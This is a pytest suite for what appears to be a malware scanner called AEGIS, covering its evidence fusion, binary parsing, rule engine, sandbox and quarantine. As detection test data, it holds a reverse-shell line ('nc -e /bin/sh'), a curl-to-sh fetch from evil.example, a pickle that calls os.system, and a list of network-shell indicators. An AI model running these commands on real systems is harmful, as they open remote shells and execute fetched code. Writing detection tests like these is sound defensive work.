"""
Test suite for AEGIS. Mirrors the design document's invariants (S8-S24) and
locks in every self-detection / calibration lesson so regressions are caught
here, not on a user's disk.

Run:  pytest -q
"""
import pickle
import random
import zipfile
from pathlib import Path

import numpy as np
import pytest

from aegis import core, fixtures, formats, peparse, simhash, metrics, rules as rulemod
from aegis import train as trainmod
from aegis.allowlist import Allowlist, sha256
from aegis.intel import Blocklist
from aegis.scanner import Scanner, Model
from aegis.pickle_scan import scan as pickle_scan
from aegis.detectors import static as D


# ---------------------------------------------------------------------------
@pytest.fixture(scope="module")
def model():
    return trainmod.train(seed=0)


@pytest.fixture
def scanner(model, tmp_path):
    al = Allowlist(tmp_path / "a.json")
    bl = Blocklist(tmp_path / "b.json")
    return Scanner(model, allowlist=al, blocklist=bl)


# --- core math -------------------------------------------------------------
def test_logit_sigmoid_roundtrip():
    for p in (0.01, 0.3, 0.5, 0.7, 0.99):
        assert abs(core.sigmoid(core.logit(p)) - p) < 1e-6


def test_evidence_llr_uses_calibration_baserate():
    # exact naive-Bayes update: LLR = logit(p) - logit(pi_cal) (S12)
    e = core.Evidence("x", p=0.9, pi_cal=0.36)
    assert abs(e.llr() - (core.logit(0.9) - core.logit(0.36))) < 1e-9


def test_abstain_contributes_zero():
    e = core.Evidence("x", p=0.99, abstain=True)
    assert e.contribution() == 0.0


def test_fuse_allowlist_beats_everything():
    ev = [core.Evidence("signature", force_block=True, reasons=["bad hash"]),
          core.Evidence("allowlist", force_allow=True, reasons=["trusted"])]
    v = core.fuse("f", ev, prior=0.5)
    assert v.decision == "ALLOW"


def test_fuse_force_block_reason_is_honest():
    # a rule block must NOT claim a hash match (S21)
    ev = [core.Evidence("rule", force_block=True,
                        reasons=["custom rule match: R (block rule)"])]
    v = core.fuse("f", ev, prior=0.001)
    assert v.decision == "BLOCK"
    assert "rule" in v.reasons[0].lower()
    assert "sha-256" not in v.reasons[0].lower()


def test_disagreement_widens_band():
    agree = [core.Evidence("a", p=0.6), core.Evidence("b", p=0.6)]
    fight = [core.Evidence("a", p=0.05), core.Evidence("b", p=0.95)]
    assert core._disagreement(fight) > core._disagreement(agree)


# --- formats ---------------------------------------------------------------
def test_utf8_heavy_source_reads_as_text():
    # unicode-heavy module must be text, not a binary blob (S18 gap 2)
    data = "spinners = ['⠋','⠙','⠹','🌍','🌎']\nimport os\n".encode("utf-8") * 20
    assert formats.is_text(data)


def test_elf_object_recognized_as_relocatable():
    # minimal ELF header, e_type = ET_REL (1)
    hdr = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8
    hdr += (1).to_bytes(2, "little")  # e_type = ET_REL
    assert formats.is_elf_relocatable(hdr + b"\x00" * 64)


def test_container_formats_recognized():
    assert formats.known_container_format(b"PK\x03\x04rest")
    assert formats.known_container_format(b"Caml1999X011rest")
    assert formats.known_container_format(b"GGUF" + b"\x00" * 20)


# --- PE parsing + imphash --------------------------------------------------
def test_pe_builder_roundtrips_through_parser():
    pe = fixtures.build_pe(fixtures._RAT, packed=True, seed=1)
    info = peparse.parse(pe)
    assert info.parsed and info.kind == "pe"
    assert "ws2_32.dll.connect" in info.imports
    assert info.wx_sections >= 1
    assert len(info.imphash) == 32


def test_imphash_stable_across_family_rebuild():
    a = peparse.parse(fixtures.build_pe(fixtures._INJECTOR, packed=True, seed=1)).imphash
    b = peparse.parse(fixtures.build_pe(fixtures._INJECTOR, packed=True, seed=2)).imphash
    assert a and a == b


def test_signature_downgrades_soft_benign():
    signed = fixtures.build_pe(fixtures._BENIGN_APP, packed=True, signed=True, seed=1)
    assert peparse.parse(signed).has_signature


# --- fuzzy hashing ---------------------------------------------------------
def test_ctph_one_byte_change_is_near_identical():
    rng = random.Random(0)
    data = bytes(rng.randrange(256) for _ in range(4000))
    variant = bytearray(data); variant[100] ^= 0xFF
    s = simhash.similarity(simhash.ctph(data), simhash.ctph(bytes(variant)))
    assert s >= 90


def test_ctph_unrelated_files_are_dissimilar():
    r1 = random.Random(1); r2 = random.Random(2)
    a = bytes(r1.randrange(256) for _ in range(4000))
    b = bytes(r2.randrange(256) for _ in range(4000))
    assert simhash.similarity(simhash.ctph(a), simhash.ctph(b)) < 50


# --- pickle scanner --------------------------------------------------------
def test_malicious_pickle_detected():
    class E:
        def __reduce__(self):
            import os
            return (os.system, ("id",))
    rep = pickle_scan(pickle.dumps(E()))
    assert rep.malicious and rep.calls_dangerous


def test_benign_pickle_silent():
    rep = pickle_scan(pickle.dumps({"w": [1, 2, 3], "name": "layer"}))
    assert not rep.malicious


# --- rule engine (D8) ------------------------------------------------------
def test_rule_boolean_grammar():
    text = '''rule R {
        strings:
            $a = "foo"
            $b = "bar"
        condition:
            $a and $b
    }'''
    r = rulemod.parse_rules(text)
    assert rulemod.match_rules(b"foo...bar", r)
    assert not rulemod.match_rules(b"foo only", r)


def test_rule_malformed_pattern_is_skipped_not_fatal():
    text = '''rule R {
        strings:
            $a = { ZZ }
            $b = "ok"
        condition:
            any of them
    }'''
    r = rulemod.parse_rules(text)      # must not raise
    assert rulemod.match_rules(b"contains ok", r)


def test_eicar_rule_matches_file_not_name():
    r = rulemod.builtin_rules()
    assert rulemod.match_rules(fixtures.EICAR, r)               # the 68-byte file
    big = b"the string EICAR-STANDARD-ANTIVIRUS-TEST-FILE appears here\n" * 300
    assert not rulemod.match_rules(big, r)                      # a doc quoting it


def test_filesize_predicate():
    text = '''rule Big {
        strings:
            $a = "x"
        condition:
            $a and filesize > 1KB
    }'''
    r = rulemod.parse_rules(text)
    assert not rulemod.match_rules(b"x", r)
    assert rulemod.match_rules(b"x" + b"y" * 2000, r)


# --- end-to-end scanner behavior ------------------------------------------
def test_benign_prose_allows(scanner):
    v = scanner.scan_bytes(fixtures._realistic_prose(random.Random(3)), "m.txt")
    assert v.decision == "ALLOW"


def test_injector_blocks(scanner):
    pe = fixtures.build_pe(fixtures._INJECTOR, packed=True, seed=55)
    v = scanner.scan_bytes(pe, "i.exe", profile="max")
    assert v.decision in ("BLOCK", "REVIEW")


def test_malicious_text_is_reviewed_not_blocked(scanner):
    txt = (b"#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\n"
           b"curl http://evil.example/x|sh\nCurrentVersion\\Run\n") * 4
    v = scanner.scan_bytes(txt, "x.sh", profile="max")
    assert v.decision != "BLOCK"


def test_malicious_pe_with_same_strings_still_blocks(scanner):
    # the same indicators in a *binary* are concealed payload -> may BLOCK
    pe = fixtures.build_pe(fixtures._RANSOM, packed=True, seed=66)
    v = scanner.scan_bytes(pe, "r.exe", profile="max")
    assert v.decision in ("BLOCK", "REVIEW")


def test_rules_absent_leaves_ensemble_unchanged(model, tmp_path):
    data = fixtures.build_pe(fixtures._BENIGN_APP, packed=False, seed=7)
    s1 = Scanner(model, allowlist=Allowlist(tmp_path / "a.json"))
    v1 = s1.scan_bytes(data, "a.exe")
    # adding an unrelated, non-matching rule set must not change the verdict
    r = rulemod.parse_rules('rule Z {\n strings:\n  $z="zzzz"\n condition:\n  $z\n}')
    s2 = Scanner(model, allowlist=Allowlist(tmp_path / "a2.json"), extra_rules=r)
    v2 = s2.scan_bytes(data, "a.exe")
    assert abs(v1.posterior - v2.posterior) < 1e-9


def test_allowlist_overrides_block(model, tmp_path):
    pe = fixtures.build_pe(fixtures._INJECTOR, packed=True, seed=88)
    al = Allowlist(tmp_path / "a.json"); al.add_hash(sha256(pe))
    s = Scanner(model, allowlist=al)
    v = s.scan_bytes(pe, "i.exe", profile="max")
    assert v.decision == "ALLOW"


def test_no_benign_hash_in_signature_db(model):
    benign = {sha256(d) for _, d, lab in fixtures.make_corpus(0) if lab == 0}
    assert not (benign & set(h.lower() for h in model.bad_hashes))


def test_learners_abstain_on_text(model):
    text = b"import os\n" + b"# a perfectly ordinary python module\n" * 50
    is_text = formats.is_text(text)
    from aegis.detectors.learned import should_abstain
    assert should_abstain(text, is_text, formats.sniff_magic(text))


def test_learners_do_not_abstain_on_real_binary():
    pe = fixtures.build_pe(fixtures._INJECTOR, packed=True, seed=9)
    from aegis.detectors.learned import should_abstain
    assert should_abstain(pe, False, formats.sniff_magic(pe)) == ""


def test_dynamic_sandbox_blocks_network_escape():
    from aegis import dynamic
    src = b"import socket\ns=socket.socket()\ns.connect(('10.0.0.1',4444))\n"
    res = dynamic.analyze_bytes(src, timeout=5)
    assert res.ran and res.violated
    assert any(v["category"] == "network" for v in res.violations)


def test_dynamic_sandbox_blocks_process_escape():
    from aegis import dynamic
    src = b"import os\nos.system('echo pwned > /tmp/x')\n"
    res = dynamic.analyze_bytes(src, timeout=5)
    assert res.ran and res.violated
    assert any(v["category"] == "process" for v in res.violations)


def test_dynamic_sandbox_passes_compute_only():
    from aegis import dynamic
    res = dynamic.analyze_bytes(b"x=sum(range(100))\nprint(x)\n", timeout=5)
    assert res.ran and not res.violated


def test_dynamic_not_run_on_non_python():
    from aegis import dynamic
    res = dynamic.analyze_bytes(b"\x7fELF\x02\x01\x01" + b"\x00" * 60)
    assert not res.ran


def test_signed_binary_downgraded_not_blocked(scanner):
    signed = fixtures.build_pe(fixtures._INJECTOR, packed=True, signed=True, seed=321)
    assert peparse.parse(signed).has_signature
    v = scanner.scan_bytes(signed, "signed.exe", profile="max")
    assert v.decision != "BLOCK"           # signed -> REVIEW, never quarantined


def test_unsigned_injector_still_blocks(scanner):
    unsigned = fixtures.build_pe(fixtures._INJECTOR, packed=True, signed=False, seed=321)
    v = scanner.scan_bytes(unsigned, "u.exe", profile="max")
    assert v.decision in ("BLOCK", "REVIEW")


def test_d7_stands_down_on_python_source():
    # a python module that DEFINES indicator strings must not read as malware
    src = (b"LOLBINS = ['certutil -decode', 'nc -e /bin/sh', 'rundll32']\n"
           b"RUN_KEY = 'CurrentVersion\\\\Run'\n"
           b"def scan(data):\n    return any(x.encode() in data for x in LOLBINS)\n")
    ev = D.d7_ioc(src, True, "", None)
    assert ev.p <= 0.5 and not ev.review_only


def test_d7_still_flags_shell_script():
    # a real .sh reverse shell (not python) is still surfaced
    sh = (b"#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\n"
          b"curl http://evil.example/x|sh\nCurrentVersion\\Run\n")
    ev = D.d7_ioc(sh, True, "", None)
    assert ev.review_only and ev.cap_review


def test_cost_model_lowers_threshold_for_higher_miss_cost():
    rng = np.random.default_rng(0)
    y = np.array([0] * 150 + [1] * 30)
    s = np.concatenate([rng.beta(2, 8, 150), rng.beta(8, 2, 30)])
    t_bal, _ = metrics.best_threshold_by_cost(y, s, c_fn=1, c_fp=1, prior=0.1)
    t_max, _ = metrics.best_threshold_by_cost(y, s, c_fn=25, c_fp=1, prior=0.1)
    assert t_max <= t_bal


def test_pr_auc_and_roc_auc_agree_on_perfect_separation():
    y = [0, 0, 0, 1, 1, 1]
    s = [0.1, 0.2, 0.3, 0.7, 0.8, 0.9]
    assert abs(metrics.roc_auc(y, s) - 1.0) < 1e-9
    assert abs(metrics.pr_auc(y, s) - 1.0) < 1e-9


def test_keylogger_and_downloader_families_detected(scanner):
    klog = fixtures.build_pe(fixtures._KEYLOGGER, packed=True, seed=6100)
    dl = fixtures.build_pe(fixtures._DOWNLOADER, packed=True, seed=7100)
    assert scanner.scan_bytes(klog, "k.exe", profile="max").decision in ("BLOCK", "REVIEW")
    assert scanner.scan_bytes(dl, "d.exe", profile="max").decision in ("BLOCK", "REVIEW")


def test_external_dynamic_backend_parses_trace(monkeypatch, tmp_path):
    import sys as _sys
    from aegis import dynamic
    emit = tmp_path / "emit.py"
    emit.write_text(
        "import json\n"
        "print(json.dumps({'events': [{'category': 'process',"
        " 'event': 'os.system', 'detail': 'x'}]}))\n", encoding="utf-8")
    monkeypatch.setenv("AEGIS_DYNAMIC_CMD", f'"{_sys.executable}" "{emit}"')
    pe = fixtures.build_pe(fixtures._RAT, packed=True, seed=999)
    res = dynamic.analyze_external(pe, timeout=15)
    assert res.ran and res.violated


def test_calibrated_thresholds_round_trip(model, tmp_path):
    model.thresholds = [0.02, 0.30]
    p = tmp_path / "m.json"
    model.save(p)
    from aegis.scanner import Model as M
    m2 = M.load(p)
    assert m2.thresholds == [0.02, 0.30]


def test_load_corpus_drops_label_conflicts(tmp_path):
    from aegis import train as trainmod
    (tmp_path / "benign").mkdir(); (tmp_path / "malicious").mkdir()
    same = b"AMBIGUOUS-CONTENT-1234567890"
    (tmp_path / "benign" / "a.bin").write_bytes(same)
    (tmp_path / "malicious" / "b.bin").write_bytes(same)
    (tmp_path / "malicious" / "real.bin").write_bytes(b"only-malicious-xyz")
    items = trainmod.load_corpus_dir(str(tmp_path))
    # the conflicting content is dropped; the unambiguous malicious file remains
    contents = {d for _, d, _ in items}
    assert same not in contents
    assert b"only-malicious-xyz" in contents


def test_macro_document_detected(scanner):
    from aegis.detectors import documents
    mal = fixtures.build_ole2_doc(malicious=True)
    assert documents.detect(mal).p >= 0.8
    v = scanner.scan_bytes(mal, "m.doc", profile="max")
    assert v.decision in ("BLOCK", "REVIEW")


def test_ooxml_macro_and_clean_docx(scanner):
    assert scanner.scan_bytes(fixtures.build_docx(macro=True), "m.docm",
                              profile="max").decision in ("BLOCK", "REVIEW")
    assert scanner.scan_bytes(fixtures.build_docx(macro=False), "ok.docx").decision == "ALLOW"


def test_pdf_javascript_detected_clean_allowed(scanner):
    assert scanner.scan_bytes(fixtures.build_pdf(malicious=True), "x.pdf",
                              profile="max").decision in ("BLOCK", "REVIEW")
    assert scanner.scan_bytes(fixtures.build_pdf(malicious=False), "ok.pdf").decision == "ALLOW"


def test_macho_parses_dylibs():
    mo = fixtures.build_macho(("/usr/lib/libSystem.B.dylib",))
    info = peparse.parse(mo)
    assert info.kind == "macho" and info.imports
    assert formats.is_runnable_image(mo)


def test_leave_one_out_ensemble_holds(scanner):
    from aegis import adversarial
    baseline, rows = adversarial.leave_one_out(scanner, profile="max")
    assert baseline != "ALLOW"
    assert all(dec != "ALLOW" for _, dec in rows)


def test_ensemble_beats_best_single_detector():
    from aegis import adversarial
    gain = adversarial.ensemble_gain(fixtures.make_corpus(seed=0))
    assert gain["FUSED"] >= gain["best_single"]


def test_evasions_defeat_target_but_ensemble_holds(scanner):
    from aegis import adversarial
    for r in adversarial.run_evasions(scanner, profile="max"):
        assert r.ensemble_held      # ensemble flags after every single-detector evasion


def test_scanjob_flags_malware_and_reports_progress(scanner, tmp_path):
    from aegis import scanjob
    (tmp_path / "note.txt").write_text("Dear team, please review the report.")
    (tmp_path / "inj.exe").write_bytes(fixtures.build_pe(fixtures._INJECTOR,
                                                         packed=True, seed=61))
    (tmp_path / "evil.pdf").write_bytes(fixtures.build_pdf(malicious=True))
    progress = []
    job = scanjob.ScanJob(scanner, [tmp_path], profile="max")
    job.run(on_progress=lambda i, t, f: progress.append(i))
    s = job.summary
    assert s.scanned == 3
    assert s.threats >= 2                 # injector + malicious pdf
    assert progress and progress[-1] == 3


def test_scanjob_cancel(scanner, tmp_path):
    from aegis import scanjob
    for i in range(20):
        (tmp_path / f"f{i}.txt").write_text("benign content " * 10)
    job = scanjob.ScanJob(scanner, [tmp_path])
    job.cancel()                          # cancel before running
    job.run()
    assert job.summary.cancelled


def test_realtime_watcher_catches_new_file(scanner, tmp_path):
    from aegis import scanjob
    import time
    (tmp_path / "existing.txt").write_text("nothing to see")
    caught = []
    w = scanjob.RealtimeWatcher(scanner, [tmp_path], profile="max", interval=0.3)
    w.start(on_threat=lambda r: caught.append(r))
    time.sleep(0.2)
    (tmp_path / "rat.exe").write_bytes(fixtures.build_pe(fixtures._RAT,
                                                         packed=True, seed=62))
    time.sleep(1.0)
    w.stop()
    assert any(c["decision"] in ("BLOCK", "REVIEW") for c in caught)


def test_gui_module_imports_without_display():
    import aegis.gui as gui
    assert hasattr(gui, "launch")        # importable even where Tk is absent


def test_scanning_python_with_invalid_escape_is_silent(scanner):
    import warnings
    # real .py files routinely contain invalid escapes (Windows paths, regexes);
    # D3's ast.parse must not leak SyntaxWarnings to the console during a scan
    src = b'import os\np = "C:\\\\x" + "\\Afoo"\ndef f():\n    return os.getpid()\n'
    with warnings.catch_warnings(record=True) as w:
        warnings.simplefilter("always")
        v = scanner.scan_bytes(src, "weird.py")
    assert not any(issubclass(x.category, SyntaxWarning) for x in w)
    assert v.decision == "ALLOW"


def test_quarantine_neuter_restore_roundtrip(tmp_path):
    from aegis.quarantine import Quarantine
    src = tmp_path / "mal.bin"
    src.write_bytes(b"MZ" + bytes(range(256)) * 4)
    q = Quarantine(tmp_path / "quar")
    qid = q.store(str(src), {"decision": "BLOCK"})
    stored = (tmp_path / "quar" / f"{qid}.quar").read_bytes()
    assert stored[:2] != b"MZ"                       # header neutered
    out = tmp_path / "restored.bin"
    q.restore(qid, str(out))
    assert out.read_bytes() == src.read_bytes()      # byte-for-byte restore
